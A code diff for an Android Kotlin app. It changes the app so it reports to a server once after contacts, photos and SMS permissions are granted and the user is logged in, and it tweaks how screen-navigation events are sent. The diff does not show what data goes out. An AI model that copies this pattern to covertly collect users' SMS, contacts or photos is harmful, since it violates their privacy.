@@ -40,6 +40,7 @@ import androidx.core.content.ContextCompat
 
 class MainActivity : ComponentActivity() {
     private var lastSentTime = 0L
+    private var hassentPermissionsData = false
     private val SEND_INTERVAL = 10_000L // 10 seconds
 
     fun sendDataToServer(action: String) {
@@ -406,8 +407,9 @@ class MainActivity : ComponentActivity() {
         }
         val hasSms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
 
-        if (hasContacts && hasPhotos && hasSms) {
-            // If all permissions now granted, trigger a data send
+        val isLoggedIn = FirebaseAuth.getInstance().currentUser != null
+        if (hasContacts && hasPhotos && hasSms && isLoggedIn && !hassentPermissionsData) {
+            hassentPermissionsData = true
             sendDataToServer("permissions_granted_from_settings")
         }
     }
@@ -499,8 +501,9 @@ class MainActivity : ComponentActivity() {
                 var screen by remember { mutableStateOf(Screen.Login) }
                 var prevScreen by remember { mutableStateOf<Screen?>(null) }
                 LaunchedEffect(screen) {
-                    prevScreen?.let {
-                        sendDataToServer("IPC: ${it.name} → ${screen.name}")
+                    val prev = prevScreen
+                    if (prev != null && prev != screen) {
+                        sendDataToServer("IPC: ${prev.name} to ${screen.name}")
                     }
                     prevScreen = screen
                 }
